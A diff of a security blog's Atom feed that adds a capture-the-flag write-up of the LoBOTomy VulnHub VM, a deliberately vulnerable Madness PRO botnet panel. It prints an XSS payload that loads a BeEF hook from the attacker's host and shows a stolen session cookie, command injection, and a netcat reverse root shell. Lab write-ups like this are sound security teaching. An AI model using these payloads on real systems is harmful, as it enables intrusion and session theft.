@@ -4,7 +4,7 @@
   <title><![CDATA[Category: boot2root | vinicius777 - InfoSec]]></title>
   <link href="http://vinicius777.github.io/blog/categories/boot2root/atom.xml" rel="self"/>
   <link href="http://vinicius777.github.io/"/>
-  <updated>2014-06-05T12:45:50+10:00</updated>
+  <updated>2014-06-12T13:42:53+10:00</updated>
   <id>http://vinicius777.github.io/</id>
   <author>
     <name><![CDATA[Vinicius Marino]]></name>
@@ -12,6 +12,181 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[LoBOTomy - Writeup]]></title>
+    <link href="http://vinicius777.github.io/blog/2014/06/12/lobotomy-writeup/"/>
+    <updated>2014-06-12T09:13:20+10:00</updated>
+    <id>http://vinicius777.github.io/blog/2014/06/12/lobotomy-writeup</id>
+    <content type="html"><![CDATA[<p>From the series Malware Must Die, Bwall <a href="https://twitter.com/botnet_hunter" target="_black"> @botnet_hunter </a> created the vulnerable VM that allows us to play with the BOTNET without doing anything illegal across the Internet. The VM holds the Madness PRO Panel that is vulnerable by itself. 
+<!-- more --></p>
+
+<h3> Madness PRO! </h3>
+
+<p>Madness PRO is a relatively recent DDoS botnet, fist seen by ASERT in the second half of 2013 and also profiled by <a href="http://malware.dontneedcoffee.com/2013/10/meet-madness-pro-or-few-days-rise-of.html" target="_black"> Kafeine</a> in October 2013.
+A botnet hunter called Bwall woundn’t sleep without spend a good few hours poking the bot and the panel vulnerabilities (silly botters), check his blog at <a href="http://blog.cylance.com/a-study-in-bots-lobotomy" target="_blank"> blog.cylance.com/a-study-in-bots-labotomy </a> and the complete study at <a href="http://blog.cylance.com/a-study-in-bots-madness-pro" target="_blank"> blog.cylance.com/a-study-in-bots-madness-pro<a></a>.</a></p>
+
+<p>Note, before you attempt this VM you may want to read Bwall blog’s post, useful information about how the panel works and what could be used to exploit the panel, in other words, he did the heavy lift for all of us! </p>
+
+<h3> Poke Around </h3>
+
+<p>Once access HTTP you will see information about the VM and a few PROTIPS that you may want to follow during the game!</p>
+
+<center>
+<img src="/images/madness1.png" title="" >
+</center>
+
+<p>A dirb custom wordlist was running on the background trying to get the bot panel source as the protips suggests. The Panel is located in the web root directory “http://192.168.1.25/Panel.zip”.</p>
+
+<p>When unzip the file, ‘inc/config.php’ holds the password used to login  “http://192.168.1.25/m/adm/auth.php” but I know (it’s on Bwall blog) that the panel is vulnerable to XSS and also, SmilerJS access the panel every minute.</p>
+
+<p>Thinking of this perspective, I could setup an evil php cookie stealer and steal the cookies to access the panel as admin (hard way) or type madness/madness user/password also would work and save me from this work.</p>
+
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="CodeRay">
+  <div class="code"><pre>
+<span class="local-variable">$conf</span>[‘adname’]  = “madness”;&lt;br /&gt;
+<span class="local-variable">$conf</span>[‘adpass’]  = “madness”;
+<span class="local-variable">$conf</span>[‘guname’]  = “mad”;
+<span class="local-variable">$conf</span>[‘gupass’]  = “madness”;
+</pre></div>
+</div>
+ </figure></notextile></div></p>
+
+<p>Yeah! That’s right, Let’s go for the hard way!</p>
+
+<h3> Hooking </h3>
+
+<p>When comes to XSS, BEEF project is the best tool to use, it does not hold you back! Wondering what would be my life without BEEF framework…</p>
+
+<p><div class="window">
+          <nav class="control-window">
+            <a href="#finder" class="close" data-rel="close">close</a>
+            <a href="#" class="minimize">minimize</a>
+            <a href="#" class="deactivate">deactivate</a>
+          </nav>
+          <h1 class="titleInside">Terminal</h1>
+          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>/usr/share/beef-xss# ./beef</span><span class='line output'>	[10:59:06][<em>] Bind socket [imapeudora1] listening on [0.0.0.0:2000].
+</span><span class='line output'>	[10:59:06][</em>] Browser Exploitation Framework (BeEF) 0.4.4.5-alpha
+</span><span class='line output'>	[10:59:06]    |   Twit: @beefproject
+</span><span class='line output'>	[10:59:06]    |   Site: http://beefproject.com
+</span><span class='line output'>	[10:59:06]    |   Blog: http://blog.beefproject.com
+</span><span class='line output'>	[10:59:06]    |_  Wiki: https://github.com/beefproject/beef/wiki
+</span><span class='line output'>	[10:59:06][<em>] Project Creator: Wade Alcorn (@WadeAlcorn)
+</span><span class='line output'>	[10:59:07][</em>] BeEF is loading. Wait a few seconds…
+</span><span class='line output'>	[10:59:07][<em>] 10 extensions enabled.
+</span><span class='line output'>	[10:59:07][</em>] 171 modules enabled.
+</span><span class='line output'>	[10:59:07][<em>] 2 network interfaces were detected.
+</span><span class='line output'>	[10:59:07][+] running on network interface: 127.0.0.1
+</span><span class='line output'>	[10:59:07]    |   Hook URL: http://127.0.0.1:3000/hook.js
+</span><span class='line output'>	[10:59:07]    |_  UI URL:   http://127.0.0.1:3000/ui/panel
+</span><span class='line output'>	[10:59:07][+] running on network interface: 192.168.1.13
+</span><span class='line output'>	[10:59:07]    |   Hook URL: http://192.168.1.13:3000/hook.js
+</span><span class='line output'>	[10:59:07]    |_  UI URL:   http://192.168.1.13:3000/ui/panel
+</span><span class='line output'>	[10:59:07][</em>] RESTful API key: 1dad2d1bf169671680757610ac50df2511f90748
+</span><span class='line output'>	[10:59:07][<em>] HTTP Proxy: http://127.0.0.1:6789
+</span><span class='line output'>	[10:59:07][</em>] BeEF server started (press control+c to stop)</span></code></pre></td></tr></table></div></div>
+        </div></p>
+
+<p>Once beef is up and ruuning, It’s ready to hook abusing the XSS vulnerability present on the madness panel. Let’s send the request using curl:</p>
+
+<p><div class="window">
+          <nav class="control-window">
+            <a href="#finder" class="close" data-rel="close">close</a>
+            <a href="#" class="minimize">minimize</a>
+            <a href="#" class="deactivate">deactivate</a>
+          </nav>
+          <h1 class="titleInside">Terminal</h1>
+          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line output'></p>
+</span><span class='line output'>
+</span><span class='line output'><p>~ curl -v “http://192.168.1.25/m/?uid=12345%3Cimg%20alt%3D')%3B%5C%22%3E%3Cscript%20src="http://192.168.1.13:3000/hook.js"&gt;%3C%2Fscript%3E%3C%2Fa%3E%3Ca%20href%3D%22%23%22%20onload%3D%5C%22set_status('12345”
+</span><span class='line output'>* About to connect() to 192.168.1.25 port 80 (#0)
+</span><span class='line output'>*   Trying 192.168.1.25…
+</span><span class='line output'>* connected
+</span><span class='line output'>* Connected to 192.168.1.25 (192.168.1.25) port 80 (#0)
+</span><span class='line output'>&gt; GET /m/?uid=12345%3Cimg%20alt%3D')%3B%5C%22%3E%3Cscript%20src=”http://192.168.1.13:3000/hook.js”&gt;%3C%2Fscript%3E%3C%2Fa%3E%3Ca%20href%3D%22%23%22%20onload%3D%5C%22set_status('12345 HTTP/1.1
+</span><span class='line output'>&gt; User-Agent: curl/7.26.0
+</span><span class='line output'>&gt; Host: 192.168.1.25
+</span><span class='line output'>&gt; Accept: <em>/</em>
+</span><span class='line output'>&gt; 
+</span><span class='line output'>* additional stuff not fine transfer.c:1037: 0 0
+</span><span class='line output'>* HTTP 1.1 or later with persistent connection, pipelining supported
+</span><span class='line output'>&lt; HTTP/1.1 200 OK
+</span><span class='line output'>&lt; Date: Thu, 12 Jun 2014 01:06:48 GMT
+</span><span class='line output'>&lt; Server: Apache/2.4.9 (Debian)
+</span><span class='line output'>&lt; X-Powered-By: PHP/5.5.11-3
+</span><span class='line output'>&lt; Content-Length: 4
+</span><span class='line output'>&lt; Content-Type: text/html
+</span><span class='line output'>&lt; 
+</span><span class='line output'>* Connection #0 to host 192.168.1.25 left intact
+</span><span class='line output'>d3Rm* Closing connection #0</span></code></pre></td></tr></table></div></div>
+        </div></p>
+
+<p><code>[11:07:32][*] New Hooked Browser [id:3, ip:192.168.1.25, type:UNKNOWN-UNKNOWN, os:Linux], hooked domain [127.0.0.1:80] Cookies: PHPSESSID=vj55ab2vhml525savcgvkrd6p6;</code></p>
+
+<p>SmilerJS browser is hooked. The PHPSESSID allows me to access the Panel as admin if I change my cookies but I am not going to access it because if I do, my browser would be hooked too due to the persistent XSS.</p>
+
+<p>The best thing to do is to enumerate the VM abusing from the XSS using BEFF framework to trun it into a shell access, maybe! ;-)</p>
+
+<h3> Enumeration </h3>
+
+<p>Enumeration over XSS is painful because it’s slow as hell and you have to be patients  about this! It’s even harder/frustration  when your victim closes the hooked browser before you attempt one single exploit. </p>
+
+<p>In this case, time isn’t a problem as the SimilerJS browser connects every minute to our hook.</p>
+
+<p>First, I enumerate the box by scan open ports as localhost, secondly, I ran the XSS proxy (running on localhost:6789 by default).</p>
+
+<center>
+<img src="/images/madness2.png" title="" >
+</center>
+
+<p>Port 8080 is open, and it’s time to run dirbuster over this port!</p>
+
+<h3> Shell Access </h3>
+
+<p>Port 8080 is open and running only for local connections which is at least suspicious, right ? </p>
+
+<p>Dirbuster is up and running, and a unexpected thing happened! When dirbuster tried to get the /id request look what I got in the output:</p>
+
+<p><code>uid=0(root) gid=0(root) groups=0(root)</code></p>
+
+<p>I quickly opened by browser, setting the proxy http confs to localhost:6789 and requested “/uname -a;id”</p>
+
+<center>
+<img src="/images/madness3.png">
+</center>
+
+<p>Bingo!</p>
+
+<p>Let me run a listener on attacker machine and make the target connect to it using netcat.</p>
+
+<p><div class="window">
+          <nav class="control-window">
+            <a href="#finder" class="close" data-rel="close">close</a>
+            <a href="#" class="minimize">minimize</a>
+            <a href="#" class="deactivate">deactivate</a>
+          </nav>
+          <h1 class="titleInside">Terminal</h1>
+          <div class="container"><div class="terminal"><table><tr><td class='code'><pre><code><span class='line command'>nc -vlp 1111</span><span class='line output'>nc: listening on :: 1111 …
+</span><span class='line output'>nc: listening on 0.0.0.0 1111 …
+</span><span class='line output'>nc: connect to 192.168.1.13 1111 from . (192.168.1.25) 60088 [60088]
+</span><span class='line output'>python -c ‘import pty;pty.spawn(“/bin/bash”)’
+</span><span class='line output'>root@madness:/# id
+</span><span class='line output'>id
+</span><span class='line output'>uid=0(root) gid=0(root) groups=0(root)
+</span><span class='line output'>root@madness:/# ls /root
+</span><span class='line output'>ls /root
+</span><span class='line output'>bindshell.py  browser.js  slimerjs-0.9.1
+</span><span class='line output'>root@madness:/#</span></code></pre></td></tr></table></div></div>
+        </div> </p>
+
+<p>The end of the game!!! Hope you like it! </p>
+
+<p>Thanks to <a href="https://www.vulnhub.com" target="_black"> VulnHub </a> and <a href="https://twitter.com/botnet_hunter" target="_black"> @botnet_hunter </a></p>
+
+<p>Comments are welcome.</p>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[SecOS - Writeup]]></title>
